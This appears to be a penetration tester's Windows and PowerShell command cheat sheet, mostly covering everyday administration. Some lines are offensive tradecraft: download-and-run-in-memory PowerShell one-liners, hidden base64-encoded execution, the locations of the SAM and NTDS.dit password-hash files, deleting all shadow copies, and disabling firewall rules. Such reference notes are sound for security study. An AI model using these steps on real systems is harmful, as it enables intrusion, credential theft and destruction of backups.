[Windows Fundamentals](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#initial-windows-theory)

# **Basic Commands**

* `dir [(optional) file/directory]`  
  * `dir /a`  
* `cd [directory]`  
* `type [file]`  
* `echo [text]`  
  * `echo [text] > [file]`  
* `mkdir [new directory]`  
* `ren [old name] [new name]`  
* `move [source] [destination]`  
* `copy [file] [destination]`  
  * `xcopy [source] [destination]`  
* `del [file(s)]`  
* `rd /s /q [directory]`  
  * PowerShell: `rd -r [directory]`

## **Special Symbols**

* `*` ⇒ all/any  
* `.` ⇒ current directory  
* `..` ⇒ previous (parent) directory

# **PowerShell**

### Download Files

* `IWR [URL] -o [file]`  
* `IWR -Uri [URL] -OutFile [file]`

| `$base = "http://[host]" $files = @("[file 1]", "[file 2]", "[file 3]") $dir = "C:\Windows\Tasks"foreach ($file in $files) {    $url = $base + $file    $path = Join-Path $dir $file    Invoke-WebRequest -Uri $url -OutFile $path    Write-Host "Downloaded $file to $path" }` |
| :---- |

  ### Run PowerShell Script in Memory

* `IEX(IWR -Uri [URL].ps1 -UseBasicParsing)`  
* `IEX(New-Object Net.WebClient).DownloadString('[URL].ps1')`

  ### Start Process

* `Start-Process -NoNewWindow -FilePath [file]`

  ### Encode PowerShell

run in Windows with `powershell -w hidden -enc [base64]`

**Windows**  
`$str = '[powershell]'`  
`[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`

`[System.Convert]::ToBase64String((Get-Content -Path [script].ps1 -Encoding byte))`

**Linux**  
`set str '[powershell]'`  
`echo -en $str | iconv -t UTF-16LE | base64 -w 0`

`cat [script].ps1 | iconv -t UTF-16LE | base64 -w 0`

## **Working with Commands/Output**

* `Get-Help [command]`  
  * `-Examples`  
* `Get-Command [pattern]`  
  * ex. `Get-Command New-*`  
* `... | Member`  
  `... | Get-Member` ⇒ see all properties (even ones not displayed by default)  
  * `-MemberType [type]`  
* `... | Select [prop1],[prop2]`  
  `... | Select-Object -Property [prop1],[prop2]` ⇒ pull out specific properties  
* `... | ?/Where [prop] -[operator] [value]`  
  `... | Where-Object -Property [prop] -[operator] [value]` ⇒ filter  
  * [Operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.4)  
    * `-Match`  
    * `-Contains`  
    * `-EQ`  
    * `-GT`  
* `... | %/ForEach [`what to do on `each iteration]`  
* `... | ForEach-Object -Begin [before loop] -Process [each iteration] -End [after loop]`  
* `... | ft [prop1],[prop2]`  
  `... | Format-Table [prop1],[prop2] -A` ⇒ display as table (properties optional)  
  * `first` \- gets the first x object  
  * `last` \- gets the last x object  
  * `unique` \- shows the unique objects  
  * `skip` \- skips x objects  
* `... | fl [prop1],[prop2]`  
  `... | Format-List [prop1],[prop2]` ⇒ display as list (properties optional)  
* `... | Sort [prop]`  
  `... | Sort-Object -Property [prop]`  
* `... | Measure`

**Script block:** within a PowerShell command, use `{` and `}`. Reference the current item with `$_`  
examples:

* `Get-Service | Where-Object { $_.Status -eq "Stopped" }`  
* `Get-Process | ForEach-Object {$_.ProcessName}`

## **PowerShell History**

* `Get-History`  
* `(Get-PSReadlineOption).HistorySavePath`  
  * `type [path]`

# **Switch 32/64-bit Terminal Process**

[https://ss64.com/nt/syntax-64bit.html](https://ss64.com/nt/syntax-64bit.html)

### OS Architecture

* `wmic os get osarchitecture`  
* `wmic cpu get datawidth /format:list`  
* `[System.Environment]::Is64BitOperatingSystem`

  ### Process Architecture

* `echo %PROCESSOR_ARCHITEW6432%` ⇒ if AMD64, then process is 32-bit  
* `[System.Environment]::Is64BitProcess`

![][image1]  
example: if running a 32-bit process (session), binaries for 64-bit (such as cmd, powershell) will be in `C:\Windows\sysNative\` (folder)

# **System Information**

* `systeminfo`  
* `ver`  
* `reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion`

# **User Management**

## **Local**

* `net user` ⇒ list users  
* `net user [username]` ⇒ list user properties  
* `net user [username] [password] /[add/delete]` ⇒ add/delete a user  
* `net user [username] [password]` OR `net user [username] *` ⇒ change user’s password

* `net localgroup` ⇒ list groups  
* `net localgroup [group]` ⇒ list group properties  
* `net localgroup [group] /[add/delete]` ⇒ add/delete a group  
* `net localgroup [group] [username] /[add/delete]` ⇒ add/delete a user to/from a group

  ### Important Groups:

* Users  
* Administrators  
* Remote Management Users ⇒ can use WinRM  
* Remote Desktop Users ⇒ can use RDP

## **Domain**

Same as local, but add `/domain` to all commands and replace `localgroup` with `group`  
**Note:** using `localgroup` with `/domain` will make changes to local groups on the DC

### Important Groups:

* Domain Users  
* Domain Admins  
* Enterprise Admins ⇒ admins for all domains in forest  
* Domain Computers  
* Domain Controllers

## **Important Files**

* C:\\Windows\\System32\\config\\SAM ⇒ local users, groups, and password hashes  
* C:\\Windows\\System32\\config\\SYSTEM ⇒ required to decrypt SAM  
* C:\\Windows\\NTDS\\NTDS.dit ⇒ domain users, groups, and password hashes

*See [Registry](#registry) section below*

# **File Management**

Recently accessed files are in `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent`

## **Search Filenames**

* `dir /a /s /b [path with wildcards]`  
  * eg. `dir /a /s /b C:\*pdf*`  
* `where /R [path] [filename]`  
* `Get-ChildItem -Path [path] -Include [filename with wildcards] -Recurse -ErrorAction SilentlyContinue`  
  * eg. `Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue`

## **Search File Contents**

* `findstr /si [contents] [filename with wildcards]`  
  * use `/i` instead of `/si` for case sensitive  
  * eg. `findstr /si password *.txt`  
* `Get-ChildItem -Path [path] -Recurse | Select-String -Pattern [contents]`

## **Alternate Data Streams**

* `[command ⁠→ type, echo, etc] > [file]:[stream]` ⇒ write to alternate stream  
* `dir /r [path]` ⇒ list all streams  
* `Get-Item -Path [path] -Stream *` ⇒ list all streams (PowerShell)  
* `more < [file]:[stream]` ⇒ view file stream contents  
* `expand [file]:[stream] [new file]` ⇒ extract stream contents, save to `[new file]`

## **Startup Directories** {#startup-directories}

* `C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` ⇒ contents executed when user logs in  
* `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` ⇒ contents executed when any user logs in

# **File Permissions**

* `icacls [folder/file]` ⇒ list permissions  
* `icacls [folder/file] /reset /t /c` ⇒ reset permissions  
* `icacls [folder/file] /grant [user]:[permission] /t /c` ⇒ grant/allow  
* `icacls [folder/file] /deny [user]:[permission] /t /c` ⇒ deny  
  * This is useful if, for example, members of a group inherit access to a file but a specific user should be denied access.  
* `icacls [folder/file] /remove [user]:[permission] /t /c` ⇒ remove permission

  ### Basic Permissions

* `F Full access`  
* `M Modify access`  
* `RX Read and execute access`  
* `R Read-only access`  
* `W Write-only access`

  ### Advanced/Inherited Permissions

See [this page](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks) of the Windows documentation.

# **Volume Shadow Management**

* `vssadmin list shadows` ⇒ list shadow copies  
* `mklink /d [path] [shadow copy]` ⇒ create link to shadow copy

* `vssadmin create shadow /for=[drive]:` ⇒ create shadow copy, windows server only  
* `wmic shadowcopy call create volume=[path]` ⇒ create shadow copy

* `vssadmin delete shadows /shadow={[shadow copy ID]}` ⇒ delete shadow copy  
* `vssadmin delete shadows /all` ⇒ delete all shadow copies

# **Program/Software Management**

## **List Software**

* `wmic product get name /value`  
* `Get-CimInstance -ClassName Win32_Product | Select-Object -Property Name`

  ### 32-bit Software Only

* `reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /s /f DisplayName`  
* `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

  ### 64-bit Software Only

* `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s /f DisplayName`  
* `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

## **Uninstall Software**

* `wmic product where name="[name]" call uninstall /nointeractive`

## **Windows Application Management**

* `winget search [app]` ⇒ search Microsoft store for an app  
* `winget show [app]` ⇒ show information about an app  
* `winget list` ⇒ list installed apps  
* `winget upgrade -all`  
* `winget uninstall [app]`

## **Program Folders**

* `C:\Program Files` ⇒ system programs (64-bit)  
* `C:\Program Files (x86)` ⇒ system programs (32-bit)  
* `C:\Users\[username]\AppData` ⇒ user-specific programs  
  * `Local` ⇒ this machine only  
  * `LocalLow` ⇒ same as local, but lower integrity  
  * `Roaming` ⇒ synchronised with server when logged in to a domain  
* `C:\ProgramData` ⇒ programs accessible by all users  
* `C:\Program Files\WindowsApps` ⇒ apps

# **Process Management**

* `tasklist /svc` ⇒ processes and associated services  
* `tasklist /fi "username ne nt authority\system" /v` ⇒ non-SYSTEM processes  
* `tasklist /fi "pid eq [process ID]"` ⇒ search by process ID  
* `taskkill /f /im [process name] /t` ⇒ kill process by name  
* `taskkill /f /pid [process ID] /t` ⇒ kill process by ID

* `wmic process get name,processid,executablepath`  
* `Get-Process | Select-Object -ExpandProperty Path`

# **Service Management**

* `reg query HKLM\SYSTEM\CurrentControlSet\Services` ⇒ service names  
* `sc query` ⇒ all services  
* `sc query [service]` ⇒ service status  
* `sc qc [service]` ⇒ service configuration  
* `sc [start/stop/delete] [service]`  
* `sc [create/delete] [service]`  
  * `sc create [service] binpath= "[executable]" start= auto`  
* `sc description [service] "[description]"` ⇒ change service description  
* `sc config [service] [option]= [value]`  
  * [Service Options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)

* `Get-CimInstance -ClassName win32_service | Select Name,PathName | Where-Object {$_.State -like 'Running'}` ⇒ running services

# **Service Permissions**

Adapted from [this site](https://woshub.com/set-permissions-on-windows-service/).

* `sc sdshow [service]` ⇒ list service permissions  
* `sc sdset [service] "[permissions]"` ⇒ set service permissions

Permissions are written in the following format:  
`[ACL]:([A/D];;[permissions];;;[object/SID])`

### Access Control List (ACL)

* `S: System ACL (SACL)`  
* `D: Discretionary ACL (DACL)`

A/D ⇒ allow/deny

### Permissions

* `CC SERVICE_QUERY_CONFIG` (query service settings)  
* `LC SERVICE_QUERY_STATUS` (get service status)  
* `SW SERVICE_ENUMERATE_DEPENDENTS`  
* `LO SERVICE_INTERROGATE`  
* `CR SERVICE_USER_DEFINED_CONTROL`  
* `RC READ_CONTROL`  
* `RP SERVICE_START`  
* `WP SERVICE_STOP`  
* `DT SERVICE_PAUSE_CONTINUE`

  ### Common Objects

* `AU Authenticated users`  
* `AO Account operators`  
* `RU Alias to allow previous Windows 2000`  
* `AN Anonymous logon`  
* `AU Authenticated users`  
* `BA Built-in administrators`  
* `BG Built-in guests`  
* `BO Backup operators`  
* `BU Built-in users`  
* `CA Certificate server administrators`  
* `CG Creator group`  
* `CO Creator owner`  
* `DA Domain administrators`  
* `DC Domain computers`  
* `DD Domain controllers`  
* `DG Domain guests`  
* `DU Domain users`  
* `EA Enterprise administrators`  
* `ED Enterprise domain controllers`  
* `WD Everyone`  
* `PA Group Policy administrators`  
* `IU Interactively logged-on user`  
* `LA Local administrator`  
* `LG Local guest`  
* `LS Local service account`  
* `SY Local system`  
* `NU Network logon user`  
* `NO Network configuration operators`  
* `NS Network service account`  
* `PO Printer operators`  
* `PS Personal self`  
* `PU Power users`  
* `RS RAS servers group`  
* `RD Terminal server users`  
* `RE Replicator`  
* `RC Restricted code`  
* `SA Schema administrators`  
* `SO Server operators`  
* `SU Service logon user`

# **Scheduled Tasks**

[Scheduled Tasks Cheat Sheet](https://ss64.com/nt/schtasks.html)

* `schtasks /query /fo list` ⇒ list scheduled tasks  
* `schtasks /query /tn [name] /fo list /v` ⇒ list specific task details  
* `schtasks /delete /f /tn [name]` ⇒ delete task

  ### File Locations

* `C:\Windows\System32\Tasks`  
* `C:\Windows\Tasks` ⇒ legacy

# **Drivers**

* `driverquery` ⇒ all drivers  
* `pnputil /enum-drivers` ⇒ plug-n-play drivers  
* `pnputil /delete-driver [name]`

# **Registry** {#registry}

* `reg query [key]` ⇒ list all key values  
* `reg add [key] /f /v [name] /t [type] /d [data]`  
* `reg delete [key] /f`  
* `reg delete [key] /f /v [name]`  
* `reg save [key] [file]` ⇒ save registry key’s value to a file

The following system registry keys are stored in `%SystemRoot%\System32\config`:

* Sam (`HKEY_LOCAL_MACHINE\SAM`)  
* Security (`HKEY_LOCAL_MACHINE\SECURITY`)  
* Software (`HKEY_LOCAL_MACHINE\SOFTWARE`)  
* System (`HKEY_LOCAL_MACHINE\SYSTEM`)  
* Default (`HKEY_USERS\.DEFAULT`)

The following user registry keys are stored in `%USERPROFILE%\NTUSER.DAT`:

* Current User (`HKEY_LOCAL_CURRENT_USER`)

`HKLM ⇔ HKEY_LOCAL_MACHINE`  
`HKCU ⁠⇔ HKEY_CURRENT_USER`

### Environment Variables

* `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` ⇒ system-wide environment variables  
* `HKCU\Environment` ⇒ current user environment variables

  ### Installed Software

* `HKLM\SOFTWARE` ⇒ system-wide software  
* `HKCU\SOFTWARE` ⇒ current user software

  ### Service Configurations

* `HKLM\SYSTEM\CurrentControlSet\Services`

**Start Value**  
0 → kernel drivers (load before kernel initialization)  
2 → auto start  
3 → manual start

### Scheduled Task Configurations

* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks`  
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree`

  ### Run Keys

run when user logs in (similar to [Startup Directories](#startup-directories))

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`  
  * deleted after execution  
* `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
* `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`  
  * deleted after execution

  ### Other

* `HKLM\SYSTEM\MountedDevices` ⇒ mounted devices  
* `HKLM\SYSTEM\CurrentControlSet\Enum\USB` ⇒ USB devices  
* `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU` ⇒ mapped network drives

# **Networking**

* `ipconfig /all`  
* `arp -a`  
* `netstat`  
  * `-a` ⇒ show all  
  * `-n` ⇒ show numerical addresses  
  * `-o` ⇒ show pid  
  * `-p [proto]` ⇒ show specific protocol only

	examples:

* `netstat -ano`  
  * `netstat -anop tcp`

## **IP Addressing**

* `netsh interface ip show interfaces`

* `netsh interface ip set address name= "[interface]" static [ip] [subnet] [gateway]`  
* `netsh interface ip set dnsservers name= "[interface]" static [dns ip]`

* `netsh interface ip set address name= "[interface]" source=dhcp`

## **LDAP Query**

*Windows Server only*  
`dsquery * -filter [ldap filter] -attr [attr1 attr2 etc]`

* `-limit [limit]` ⇒ the number of results to display or 0 for unlimited  
* `-d [domain]` ⇒ search results for another domain

Use \* in filter as a wildcard (see examples below).  
[AD Attributes List](https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all)

**Examples:**

* `dsquery * -filter "(&(objectclass=user)(admincount=1))" -attr samaccountname name` ⇒ admin users  
* `dsquery * -filter "(operatingsystem=*10*)" -attr name operatingsystem dnshostname -limit 0` ⇒ hosts with OS version that contains 10  
* `dsquery * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection` ⇒ domain trusts  
  	1 → they trust you  
  	2 → you trust them  
  	3 → both

# **Firewall**

[Firewall Command Examples](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior)  
`netsh advfirewall firewall [show/add/set/delete] rule ?` ⇒ list available options

`Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled [True/False]`  
`Set-NetFirewallProfile -DefaultInboundAction [Allow/Block] -DefaultOutboundAction [Allow/Block]`

`Get-NetFirewallRule -Direction [Inbound/Outbound] | Disable-NetFirewallRule`

`Get-NetFirewallRule -DisplayName "*[name]*" | Where Direction -eq "Inbound"`  
`Get-NetFirewallRule -DisplayName "*[name]*" | Enable-NetFirewallRule`  
`Get-NetFirewallRule -DisplayName "*[name]*" | Disable-NetFirewallRule`

`Get-NetFirewallPortFilter | Where LocalPort -eq [port] | Get-NetFirewallRule | Where Direction -eq [Inbound/Outbound]`

* can replace `-eq [port]` with `-in [comma-separated ports]`

[image1]: <data:image/png;base64,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